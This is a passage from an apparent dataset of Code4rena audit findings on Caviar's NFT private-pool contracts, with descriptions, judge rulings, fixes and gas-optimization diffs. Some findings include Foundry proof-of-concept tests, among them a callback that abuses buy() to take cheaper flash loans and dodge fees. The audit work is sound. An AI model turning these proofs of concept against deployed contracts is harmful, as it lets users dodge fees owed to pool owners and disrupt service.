`EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions can be respectively updated to check if the `EthRouter` contract has approved the corresponding pool to spend any of the corresponding ERC721 tokens received by itself. If not, the corresponding ERC721's `setApprovalForAll` function can be called; otherwise, the corresponding ERC721's `setApprovalForAll` function should not be called.\n\n**[outdoteth (Caviar) confirmed and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/776#issuecomment-1519912118):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/7\n> \n> Proposed fix is to skip the approval step if the pool has already been approved to transfer the NFTs from the EthRouter.\n> \n> ```solidity\n> function _approveNfts(address nft, address target) internal {\n>     // check if the router is already approved to transfer NFTs from the caller\n>     if (ERC721(nft).isApprovedForAll(address(this), target)) return;\n> \n>     // approve the target to transfer NFTs from the router\n>     ERC721(nft).setApprovalForAll(target, true);\n> }\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/776#issuecomment-1527209794):**\n > The Warden has shown how, the always re-approve pattern can cause reverts, this is contingent on the specific NFT used, however, AXIE is in my opinion a sufficiently relevant token for this finding to be valid.\n> \n> Due to it's reliance on token implementation I agree with Medium Severity.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/32), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/40), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/10).\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a potential issue with the `EthRouter` contract, specifically with the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions. These functions call the `setApprovalForAll` functions of ERC721 tokens, which can cause reverts for tokens like Axie due to specific requirements. This means that the `EthRouter` contract can be \"DOS'ed\" or denied service if the functions are called multiple times with the same parameters. The report suggests a mitigation step by updating the `EthRouter` contract to check if it has already approved the corresponding pool to spend the ERC721 tokens, and only call the `setApprovalForAll` function if necessary. This issue has been confirmed and mitigated by the developers. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/776",
      "tags": [],
      "finders": [
        "rbserver"
      ]
    },
    {
      "id": "43389",
      "title": "[M-04] `changeFeeQuote` will fail for low decimal ERC20 tokens",
      "impact": "MEDIUM",
      "content": "\nPrivate pools have a \"change\" fee setting that is used to charge fees when a change is executed in the pool (user swaps tokens for some tokens in the pool). This setting is controlled by the `changeFee` variable, which is intended to be defined using 4 decimals of precision:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88>\n\n```solidity\n87:     /// @notice The change/flash fee to 4 decimals of precision. For example, 0.0025 ETH = 25. 500 USDC = 5_000_000.\n88:     uint56 public changeFee;\n```\n\nAs the comment says, in the case of ETH a value of 25 should represent 0.0025 ETH. In the case of an ERC20 this should be scaled accordingly based on the number of decimals of the token. The implementation is defined in the `changeFeeQuote` function.\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738>\n\n```solidity\n731:     function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n732:         // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n733:         uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n734:         uint256 feePerNft = changeFee * 10 ** exponent;\n735: \n736:         feeAmount = inputAmount * feePerNft / 1e18;\n737:         protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;\n738:     }\n```\n\nAs we can see in the previous snippet, in case the `baseToken` is an ERC20, then the exponent is calculated as `ERC20(baseToken).decimals() - 4`. The main issue here is that if the token decimals are less than 4, then the subtraction will cause an underflow due to Solidity's default checked math, causing the whole transaction to be reverted.\n\nSuch tokens with low decimals exist, one major example is [GUSD](https://etherscan.io/token/0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd), Gemini dollar, which has only two decimals. If any of these tokens is used as the base token of a pool, then any call to the `change` will be reverted, as the scaling of the charge fee will result in an underflow.\n\n### Proof of Concept\n\nIn the following test we recreate the \"Gemini dollar\" token (GUSD) which has 2 decimals and create a Private Pool using it as the base token. Any call to `change` or `changeFeeQuote` will be reverted due to an underflow error.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).\n\n```solidity\nfunction test_PrivatePool_changeFeeQuote_LowDecimalToken() public {\n    // Create a pool with GUSD which has 2 decimals\n    ERC20 gusd = new GUSD();\n\n    PrivatePool privatePool = new PrivatePool(\n        address(factory),\n        address(royaltyRegistry),\n        address(stolenNftOracle)\n    );\n    privatePool.initialize(\n        address(gusd), // address _baseToken,\n        address(milady), // address _nft,\n        100e18, // uint128 _virtualBaseTokenReserves,\n        10e18, // uint128 _virtualNftReserves,\n        500, // uint56 _changeFee,\n        100, // uint16 _feeRate,\n        bytes32(0), // bytes32 _merkleRoot,\n        false, // bool _useStolenNftOracle,\n        false // bool _payRoyalties\n    );\n\n    // The following will fail due an overflow. Calls to `change` function will always revert.\n    vm.expectRevert();\n    privatePool.changeFeeQuote(1e18);\n}\n```\n\n### Recommended Mitigation Steps\n\nThe implementation of `changeFeeQuote` should check if the token decimals are less than 4 and handle this case by dividing by the exponent difference to correctly scale it (i.e. `chargeFee / (10 ** (4 - decimals))`). For example, in the case of GUSD with 2 decimals, a `chargeFee` value of `5000` should be treated as `0.50`.\n\n**[outdoteth (Caviar) acknowledged](https://github.com/code-423n4/2023-04-caviar-findings/issues/858)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/858#issuecomment-1527400597):**\n > I have considered downgrading as I don't believe most tokens meet this requirement.\n> \n> That said, I believe the finding is valid per our rules, with some tokens, taking the `changeFeeQuote` will revert due to an assumption that `decimals - 4` wouldn't revert.\n> \n> The contracts cannot be used for those tokens, but since this is contingent on using such a low decimal token, I agree with Medium Severity and believe a nofix to be fine since most Stablecoins have more than 4 decimals.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a setting in private pools called \"change fee\" that is used to charge fees when a user makes a change in the pool. The setting is controlled by a variable called `changeFee` and is supposed to be defined using 4 decimals of precision. However, there is an issue with the implementation of this setting that can cause the whole transaction to be reverted. This happens when the base token of the pool has less than 4 decimals, which is the case for tokens like GUSD. The recommended mitigation step is to check the token decimals and handle this case by dividing the fee to correctly scale it. The severity of this issue is considered medium and no fix is required as most stablecoins have more than 4 decimals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/858",
      "tags": [],
      "finders": [
        "yixxas",
        "cryptonue",
        "shaka",
        "saian",
        "giovannidisiena",
        "Kek",
        "0x5rings",
        "ayden",
        "joestakey",
        "0xWeiss",
        "T1MOH",
        "0xLanterns",
        "Brenzee",
        "aviggiano",
        "adriro",
        "0x4non",
        "Naubit",
        "ToonVH",
        "0xbepresent",
        "Koolex",
        "chaduke",
        "ElKu",
        "indijanc",
        "anodaram",
        "ck"
      ]
    },
    {
      "id": "43388",
      "title": "[M-02] EthRouter can't perform multiple changes",
      "impact": "MEDIUM",
      "content": "\nEthRouter is meant to support multiple changes in one tx, but that would fail.\n\n### Proof of Concept\n\nThe function `EthRouter.change` sends `msg.value` to pool in a for loop:\n\n```js\nfor (uint256 i = 0; i < changes.length; i++) {\n    Change memory _change = changes[i];\n\n    ...\n\n    // execute change\n    PrivatePool(_change.pool).change{value: msg.value}(\n        _change.inputTokenIds,\n        _change.inputTokenWeights,\n        _change.inputProof,\n        _change.stolenNftProofs,\n        _change.outputTokenIds,\n        _change.outputTokenWeights,\n        _change.outputProof\n    );\n```\n\nThe pool subtracts the fee, and sends the rest back to the router. After the first iteration the router contains less ETH than `msg.value` and will revert\n\nAdd to `Change.t.sol` and run with `forge test --match test_twoChanges -vvvv`\n\n```js\n    function test_twoChangesOneCall() public {\n    uint256[] memory inputTokenIds = new uint256[](1);\n    uint256[] memory inputTokenWeights = new uint256[](0);\n    uint256[] memory outputTokenIds = new uint256[](1);\n    uint256[] memory outputTokenWeights = new uint256[](0);\n\n    uint256[] memory inputTokenIds2 = new uint256[](1);\n    uint256[] memory inputTokenWeights2 = new uint256[](0);\n    uint256[] memory outputTokenIds2 = new uint256[](1);\n    uint256[] memory outputTokenWeights2 = new uint256[](0);\n\n    inputTokenIds[0] = 5;\n    outputTokenIds[0] = 0;\n\n    inputTokenIds2[0] = 6;\n    outputTokenIds2[0] = 1;\n\n    EthRouter.Change[] memory changes = new EthRouter.Change[](2);\n    changes[0] = EthRouter.Change({\n        pool: payable(address(privatePool)),\n        nft: address(milady),\n        inputTokenIds: inputTokenIds,\n        inputTokenWeights: inputTokenWeights,\n        inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n        stolenNftProofs: new IStolenNftOracle.Message[](0),\n        outputTokenIds: outputTokenIds,\n        outputTokenWeights: outputTokenWeights,\n        outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))\n    });\n\n    changes[1] = EthRouter.Change({\n        pool: payable(address(privatePool)),\n        nft: address(milady),\n        inputTokenIds: inputTokenIds2,\n        inputTokenWeights: inputTokenWeights2,\n        inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n        stolenNftProofs: new IStolenNftOracle.Message[](0),\n        outputTokenIds: outputTokenIds2,\n        outputTokenWeights: outputTokenWeights2,\n        outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))\n    });\n\n    (uint256 changeFee,) = privatePool.changeFeeQuote(inputTokenIds.length * 1e18);\n\n    //WARDEN: multiply with 10 just to make sure there really is enough\n    ethRouter.change{value: changeFee*10}(changes, 0);\n\n} \n```\n\nOutput:\n\n    ...\n            [0] PrivatePool::change{value: 50000000000000000000}([6], [], ([], []), [], [1], [], ([], [])) \n                \"EvmError: OutOfFund\"\n             \"EvmError: Revert\"\n          \"EvmError: Revert\"\n\n### Recommended Mitigation Steps\n\nOnly send the required change fee and not `msg.value`.\n\n**[outdoteth (Caviar) confirmed and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/873#issuecomment-1519889954):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/5\n> \n> The proposed fix is to add a `baseTokenAmount` field in the Change struct and to use this field instead of msg.value when making the change operation.\n> \n> ```solidity\n> PrivatePool(_change.pool).change{value: _change.baseTokenAmount}(\n>   // -- snip --\n> );\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/873#issuecomment-1527397366):**\n > The Warden has shown how, because `msg.value` is passed in a loop, to functions that could reduce `this.balance`, the tx can revert, breaking the functionality for those use cases.\n> \n> Because that doesn't cause a loss of principal, but shows a broken functionality for some cases, I agree with Medium Severity.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/34), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/38), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/8).\n\n\n\n***\n\n",
      "summary": "\nThe EthRouter is a tool designed to make multiple changes in one transaction, but it is currently not working as intended. The function `EthRouter.change` sends `msg.value` to a pool in a for loop, but after the first iteration, the router contains less ETH than `msg.value` and will revert. This bug has been confirmed and mitigated, and the recommended solution is to only send the required change fee and not `msg.value`. The severity of this bug is considered medium, as it does not cause a loss of principal but does break functionality for some use cases. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/873",
      "tags": [],
      "finders": [
        "BradMoon",
        "bin2chen",
        "ladboy233",
        "Ruhum",
        "Voyvoda",
        "0xRobocop",
        "Kek",
        "chaduke",
        "Rappie",
        "0x4db5362c",
        "adriro",
        "ChrisTina",
        "minhtrng",
        "ych18"
      ]
    },
    {
      "id": "43387",
      "title": "[M-01] The buy function's mechanism enables users to acquire flash loans at a cheaper fee rate.",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211-L289>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L240>\n\n### Impact\n\nThe buy function's mechanism allows users to access flash loans at a lower fee cost, which could affect the pool owner's yield if users opt for it instead of flash loans.\n\n### Proof of Concept\n\nThe buy function initially transfers the NFTs to the buyer before verifying and receiving payment. This mechanism creates an opportunity for users to access flash loans that are akin to flash swaps in Uniswap.\n\nIt is worth noting that this scenario is only viable in pools with ERC20 tokens since they do not necessitate upfront payment, unlike payable functions. Additionally, it requires the flash loan fee to be greater than the combined buy and sell fees for the NFTs.\n\nA proof-of-concept (PoC) demonstrating this scenario is provided below:\n\n```solidity\n// @audit-info These are the default circumstances used by most of the tests:\n\nPrivatePool public privatePool;\n\naddress baseToken = address(shibaInu);\naddress nft = address(milady);\nuint128 virtualBaseTokenReserves = 100e6;\nuint128 virtualNftReserves = 10e18;\nuint16 feeRate = 1e2;\nuint56 changeFee = 3e6;\nbytes32 merkleRoot = bytes32(0);\naddress owner = address(this);\n\nuint256[] tokenIds;\nuint256[] tokenWeights;\nPrivatePool.MerkleMultiProof proofs;\nIStolenNftOracle.Message[] stolenNftProofs;\n\nfunction setUp() public {\n    privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));\n    privatePool.initialize(\n            baseToken, nft, virtualBaseTokenReserves, virtualNftReserves, changeFee, feeRate, merkleRoot, true, false\n    );\n    deal(address(shibaInu), address(this), 2e6);\n\n    // @audit-info Giving the pool 60 tokens to trade with\n    deal(address(shibaInu), address(privatePool), 100e6);\n\n    for (uint256 i = 0; i < 5; i++) {\n        milady.mint(address(privatePool), i + 1);\n    }\n    assertEq(milady.balanceOf(address(privatePool)), 5, \"Didn't mint 5 NFTs for some reason.\");\n}\n\nfunction test_failBecauseOfDivisionBy0() public {\n\n    for (uint256 i = 0; i < 5; i++) {\n        tokenIds.push(i + 1);\n    }\n\n    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.buyQuote(5e18);\n\n    shibaInu.approve(address(privatePool), netInputAmount);\n    // @audit-info Trying to buy the 5 tokens present in the pool\n    privatePool.buy(tokenIds, tokenWeights, proofs);\n}\n\nfunction onERC721Received(\n    address operator,\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n) external override returns (bytes4) {\n    // @audit-info Claim airdrop for the specific NFT here\n    airdrop.claim(tokenId);\n\n    // @audit-info Selling the NFT here\n    uint[] memory _tokenIds = new uint[](1);\n    _tokenIds[0] = tokenId;\n\n    milady.approve(address(privatePool), tokenId);\n    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.sellQuote(1e18);\n         \n    privatePool.sell(_tokenIds, tokenWeights, proofs, stolenNftProofs);\n    return bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"));\n}\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nConsider sending the NFTs after the funds have been received by the contract.\n\n**[outdoteth (Caviar) acknowledged](https://github.com/code-423n4/2023-04-caviar-findings/issues/885)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/885#issuecomment-1529117611):**\n > The Warden has shown how, due to the handling of callbacks, a `buy` can be viewed as a flash-swap which allows the payer to pay after using the token, effectively allowing for a cheaper flashloan if fees are set in a certain way.\n> \n> \n> Because the finding shows a way to possibly side-step fees, while maintaining the same functionality, I believe the most appropriate severity to be Medium.\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a potential issue with the buy function in the PrivatePool contract. This issue could allow users to access flash loans at a lower fee cost, which could affect the pool owner's yield. The report provides a proof of concept demonstrating this scenario and recommends mitigating steps such as sending the NFTs after the funds have been received by the contract. The report also mentions the tools used for finding the bug and the severity is classified as medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/885",
      "tags": [],
      "finders": [
        "KrisApostolov"
      ]
    },
    {
      "id": "22115",
      "title": "[8] In the `PrivatePoolMetadata.tokenURI` function consider using `Strings.toHexString(address(tokenId)))` for the `name` field.",
      "impact": "LOW",
      "content": "    ```solidity\n    function tokenURI(uint256 tokenId) public view returns (string memory) {\n        // forgefmt: disable-next-item\n        bytes memory metadata = abi.encodePacked(\n            \"{\",\n                '\"name\": \"Private Pool ',Strings.toString(tokenId),'\",',\n                '\"description\": \"Caviar private pool AMM position.\",',\n                '\"image\": ','\"data:image/svg+xml;base64,', Base64.encode(svg(tokenId)),'\",',\n                '\"attributes\": [',\n                    attributes(tokenId),\n                \"]\",\n            \"}\"\n        );\n\n        return string(abi.encodePacked(\"data:application/json;base64,\", Base64.encode(metadata)));\n    }\n    ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/624#issuecomment-1529479271):**\n > **1. The `Factory.create` function is susceptible to re-entrancy as it performs a `_safeMint` before initializing the pool.**<br>\n> Low\n> \n> **2. The `Factory.create` function performs plain transfer of funds instead of calling the `deposit` function. This way the `Deposit` event is not emitted.**<br>\n> Refactor\n> \n> **3. There is no fee cap on the `Factory.setProtocolFeeRate` function. A value greater then 10000 can break the fee calculations in private pool. Consider validating that the input is less than 10000.**<br>\n> Low\n> \n> **4. `Factory.tokenId` does not validate the input `id` parameter. Consider validating that the `id` exist and the respective pool is created by the factory.**<br>\n> Low\n> \n> **5. Once initialization is done the `PrivatePool.feeRate` variable can never be changed. Consider adding an `owner` restricted function to update `feeRate`.**<br>\n> Refactor\n> \n> **6. In `buy` and `sell` functions consider validating that the `length` of all input arrays are equal (`tokenIds` & `tokenWeights`).**<br>\n> Refactor\n> \n> **7. Consider adding a check in `PrivatePool.sumWeightsAndValidateProof` function to validate that every element of `tokenWeights` array is greater than or equal to `1e18`.**<br>\n> Low\n> \n> **8. In the `PrivatePoolMetadata.tokenURI` function consider using `Strings.toHexString(address(tokenId)))` for the `name` field.**<br>\n> Non-Critical\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/624#issuecomment-1529479872):**\n > 4 low, 3 refactor, and 1 non-critical.\n>\n> Also includes 6 lows from downgraded findings (issues [396](https://github.com/code-423n4/2023-04-caviar-findings/issues/396), [392](https://github.com/code-423n4/2023-04-caviar-findings/issues/392), [387](https://github.com/code-423n4/2023-04-caviar-findings/issues/387), [382](https://github.com/code-423n4/2023-04-caviar-findings/issues/382), [381](https://github.com/code-423n4/2023-04-caviar-findings/issues/381), and [719](https://github.com/code-423n4/2023-04-caviar-findings/issues/719)).\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/624#issuecomment-1529516131):**\n > Awarding best due to consistent high quality.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22114",
      "title": "[7] Consider adding a check in `PrivatePool.sumWeightsAndValidateProof` function to validate that every element of `tokenWeights` array is greater than or equal to `1e18`.",
      "impact": "LOW",
      "content": "    ```solidity\n    function sumWeightsAndValidateProof(\n        uint256[] memory tokenIds,\n        uint256[] memory tokenWeights,\n        MerkleMultiProof memory proof\n    ) public view returns (uint256) {\n        // ...\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            require(tokenWeights[i] >= 1e18);       <------------\n            // create the leaf for the merkle proof\n            leafs[i] = keccak256(bytes.concat(keccak256(abi.encode(tokenIds[i], tokenWeights[i]))));\n\n            // sum each token weight\n            sum += tokenWeights[i];\n        }\n        // ...\n    }\n    ```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22113",
      "title": "[6] In `buy` and `sell` functions consider validating that the `length` of all input arrays are equal (`tokenIds` & `tokenWeights`).",
      "impact": "LOW",
      "content": "   \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22112",
      "title": "[5] Once initialization is done the `PrivatePool.feeRate` variable can never be changed. Consider adding an `owner` restricted function to update `feeRate`.",
      "impact": "LOW",
      "content": "    \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22111",
      "title": "[4] `Factory.tokenId` does not validate the input `id` parameter. Consider validating that the `id` exist and the respective pool is created by the factory.",
      "impact": "LOW",
      "content": "    ```solidity\n    function tokenURI(uint256 id) public view override returns (string memory) {\n        return PrivatePoolMetadata(privatePoolMetadata).tokenURI(id);\n    }\n    ```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22110",
      "title": "[3] There is no fee cap on the `Factory.setProtocolFeeRate` function. A value greater then 10000 can break the fee calculations in private pool. Consider validating that the input is less than 10000.",
      "impact": "LOW",
      "content": "    ```solidity\n    function setProtocolFeeRate(uint16 _protocolFeeRate) public onlyOwner {\n        protocolFeeRate = _protocolFeeRate;\n    }\n    ```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22109",
      "title": "[2] The `Factory.create` function performs plain transfer of funds instead of calling the `deposit` function. This way the `Deposit` event is not emitted.",
      "impact": "LOW",
      "content": "    ```solidity\n    function create(\n        ...\n    ) public payable returns (PrivatePool privatePool) {\n        // ...\n        privatePool.initialize(...);\n        \n        if (_baseToken == address(0)) {\n            // transfer eth into the pool if base token is ETH\n            address(privatePool).safeTransferETH(baseTokenAmount);\n        } else {\n            // deposit the base tokens from the caller into the pool\n            ERC20(_baseToken).transferFrom(msg.sender, address(privatePool), baseTokenAmount);\n        }\n\n        // deposit the nfts from the caller into the pool\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            ERC721(_nft).safeTransferFrom(msg.sender, address(privatePool), tokenIds[i]);\n        }\n\n        // emit create event\n        emit Create(address(privatePool), tokenIds, baseTokenAmount);\n    }\n    ```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22108",
      "title": "[1] The `Factory.create` function is susceptible to re-entrancy as it performs a `_safeMint` before initializing the pool.",
      "impact": "LOW",
      "content": "    ```solidity\n    function create(\n        ...\n    ) public payable returns (PrivatePool privatePool) {\n        // ...\n        privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));\n\n        // mint the nft to the caller\n        _safeMint(msg.sender, uint256(uint160(address(privatePool))));\n\n        // initialize the pool\n        privatePool.initialize(...);\n        // ...\n    }\n    ```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "16270",
      "title": "[G-08] Use assembly for loops",
      "impact": "GAS",
      "content": "In the following instances, assembly is used for more gas efficient loops. The only memory slots that are manually used in the loops are `scratch space (0x00-0x20)`, the `free memory pointer (0x40)`, and the `zero slot (0x60)`. This allows us to avoid using the free memory pointer to allocate new memory, which may result in memory expansion costs.\n\n**Note that in order to do this optimization safely we will need to cache and restore the `free memory pointer` after the loop. We will also set the `zero slot (0x60)` back to 0.**\n\n*The [final diffs](https://gist.github.com/0xJCN/b03b5f1f8cabc937c8bbe4d4a46b8d47) have comments explaining the assembly code*.\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L119-L121\n\n*Gas Savings for `Factory.create`, obtained via protocol's tests: Avg 129 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  161124  |  245619  |  148801 |    35    |\n| After  |  161112  |  243941  |  148672 |    35    |\n\n```solidity\nFile: src/Factory.sol\n119:        for (uint256 i = 0; i < tokenIds.length; i++) {\n120:            ERC721(_nft).safeTransferFrom(msg.sender, address(privatePool), tokenIds[i]);\n121:        }\n```\n```diff\ndiff --git a/src/Factory.sol b/src/Factory.sol\nindex 09cbb4e..c2e06f6 100644\n--- a/src/Factory.sol\n+++ b/src/Factory.sol\n@@ -116,8 +116,26 @@ contract Factory is ERC721, Owned {\n         }\n\n         // deposit the nfts from the caller into the pool\n-        for (uint256 i = 0; i < tokenIds.length; i++) {\n-            ERC721(_nft).safeTransferFrom(msg.sender, address(privatePool), tokenIds[i]);\n+        assembly {\n+            if mload(tokenIds) {\n+                let memptr := mload(0x40)\n+                let end := add(add(tokenIds, 0x20), mul(0x20, mload(tokenIds)))\n+                let i := add(tokenIds, 0x20)\n+                mstore(0x00, 0x42842e0e)\n+                mstore(0x20, caller())\n+                mstore(0x40, privatePool)\n+                for {} 1 {} {\n+                    mstore(0x60, mload(i))\n+                    let success := call(gas(), calldataload(0x24), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                    if iszero(success) {\n+                        revert(0, 0)\n+                    }\n+                    i := add(i, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+                mstore(0x40, memptr)\n+                mstore(0x60, 0x00)\n+            }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L134-L137\n\n*Gas Savings for `EthRouter.buy`, obtained via protocol's tests: Avg 5728 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  187054  |  397581  |  199750 |    7     |\n| After  |  182465  |  384540  |  194022 |    7     |\n\n```solidity\nFile: src/EthRouter.sol\n134:            for (uint256 j = 0; j < buys[i].tokenIds.length; j++) {\n135:                // transfer the NFT to the caller\n136:                ERC721(buys[i].nft).safeTransferFrom(address(this), msg.sender, buys[i].tokenIds[j]);\n137:            }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..4ea89f5 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -131,9 +131,28 @@ contract EthRouter is ERC721TokenReceiver {\n                 );\n             }\n\n-            for (uint256 j = 0; j < buys[i].tokenIds.length; j++) {\n-                // transfer the NFT to the caller\n-                ERC721(buys[i].nft).safeTransferFrom(address(this), msg.sender, buys[i].tokenIds[j]);\n+            Buy calldata _buy = buys[i];\n+            uint256[] calldata _tokenIds = _buy.tokenIds;\n+            assembly {\n+                if _tokenIds.length {\n+                    let memptr := mload(0x40)\n+                    let end := add(_tokenIds.offset, mul(0x20, _tokenIds.length))\n+                    let j := _tokenIds.offset\n+                    mstore(0x00, 0x42842e0e)\n+                    mstore(0x20, address())\n+                    mstore(0x40, caller())\n+                    for {} 1 {} {\n+                        mstore(0x60, calldataload(j))\n+                        let success := call(gas(), calldataload(add(_buy, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                        if iszero(success) {\n+                            revert(0, 0)\n+                        }\n+                        j := add(j, 0x20)\n+                        if iszero(lt(j, end)) { break }\n+                    }\n+                    mstore(0x40, memptr)\n+                    mstore(0x60, 0x00)\n+                }\n             }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L161-L163\n\n*Gas Savings for `EthRouter.sell`, obtained via protocol's tests: Avg 4735 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  217300  |  402940  |  232102 |    7     |\n| After  |  212706  |  395062  |  227367 |    7     |\n\n```solidity\nFile: src/EthRouter.sol\n161:            for (uint256 j = 0; j < sells[i].tokenIds.length; j++) {\n162:                ERC721(sells[i].nft).safeTransferFrom(msg.sender, address(this), sells[i].tokenIds[j]);\n163:            }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..c1a07ab 100644\n--- 